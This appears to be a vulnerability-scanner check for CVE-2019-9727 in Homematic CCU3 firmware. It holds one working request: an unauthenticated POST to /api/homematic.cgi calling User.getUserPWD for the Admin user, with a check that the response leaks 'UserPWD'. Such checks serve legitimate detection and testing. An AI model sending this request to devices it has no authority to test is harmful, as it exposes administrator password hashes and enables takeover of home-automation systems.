name: yaml-poc-eq-3-ccu3_firmware-unauthorized_access-CVE-2019-9727
binding: b108be3f-b2aa-4a3f-8dc3-a0fea9c0ac84
detail:
    author: jiapeng.han
    links:
        - https://atomic111.github.io/article/homematic-ccu3-unauthenticated-password-hash-disclosure
        - https://nvd.nist.gov/vuln/detail/CVE-2019-9727
        - https://web.nvd.nist.gov//vuln/detail/CVE-2019-9727
    vulnerability:
        id: 8dbfafd2-7fd2-46c2-932d-52fd3615f697
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /api/homematic.cgi
            headers:
                Content-Type: application/json
            body: |
                {"version": "1.1","method": "User.getUserPWD","params": {"_session_id_": "","userID": "Admin"}}
        expression: |
            response.status == 200 && response.headers["Content-Type"].contains("application/json") && response.body.bcontains(b"}.UserPWD")
expression: r0()
